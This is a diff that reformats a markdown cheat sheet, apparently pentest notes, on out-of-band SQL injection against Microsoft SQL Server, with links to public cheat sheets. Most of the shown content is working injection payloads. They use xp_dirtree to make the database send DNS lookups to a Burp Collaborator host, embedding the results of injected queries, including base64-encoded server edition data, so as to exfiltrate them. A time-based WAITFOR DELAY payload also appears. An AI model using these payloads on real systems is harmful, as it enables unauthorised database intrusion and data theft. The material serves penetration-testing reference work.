@@ -222,10 +222,10 @@ IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
 
 DNS lookup: You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
 
-exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
+`exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`
 
 
-DNS lookup with data exfiltration
+## DNS lookup with data exfiltration
 You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
 
 	`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`
@@ -237,22 +237,25 @@ Due to the domain and subdomain max characters limitations, it becomes challengi
 (SQLi exfiltration using Out of band technique)[https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b]
 
 1-
-
+```bash
 DECLARE @d varchar(1024); DECLARE @T varchar(1024);
 SELECT @d = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
 varbinary(max)), 1,LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2) FOR XML PATH(''), BINARY BASE64);
 SELECT @T = (SELECT REPLACE(@d, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.YourBRUPCOLLAB.net\egg$"');
+```
 
 2- 
+```bash
 DECLARE @e varchar(1024); DECLARE @T varchar(1024);
 SELECT @e = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
 varbinary(max)), LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2, LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))) FOR XML PATH(''), BINARY BASE64); 
 SELECT @T = (SELECT REPLACE(@e, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.BRUPCOLLAB.net\egg$"');
+```
 
 
 
 ### Resources:
-(Pentest Monkeys Cheat Sheet)[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet]
-(Port Swigger SQL Cheat Sheet)[https://portswigger.net/web-security/sql-injection/cheat-sheet]
-# other resources add not included
-(Sqlninja's MSSQL Cheat Sheet)[http://sqlninja.sourceforge.net/sqlninja-howto.html#ss2.13]
+[Pentest Monkeys Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+[Port Swigger SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+### other resources add not included
+[Sqlninja's MSSQL Cheat Sheet](http://sqlninja.sourceforge.net/sqlninja-howto.html#ss2.13)
